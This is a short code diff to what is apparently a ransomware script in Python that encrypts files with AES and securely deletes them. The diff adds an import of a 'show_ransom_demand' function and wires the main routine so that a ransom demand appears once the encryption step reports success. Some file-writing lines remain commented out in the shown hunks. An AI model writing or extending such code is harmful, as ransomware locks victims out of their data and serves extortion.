@@ -1,6 +1,7 @@
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
-from folder_commands.execute import execute
+from commands.execute import execute
+from commands.menace import show_ransom_demand
 
 def secure_delete(file_path):
     try:
@@ -26,8 +27,9 @@ def encrypt_and_delete(file_path, key):
     # encrypted_file_path = file_path + ".enc"
     # with open(encrypted_file_path, 'wb') as f:
     #     f.write(ciphertext)
-    # encrypted_files[file_path] = encrypted_file_path
     # secure_delete(file_path)
 
 if __name__ == '__main__':
-    execute(encrypt_and_delete)
+    isCrypted = execute(encrypt_and_delete)
+    if isCrypted: 
+        show_ransom_demand()
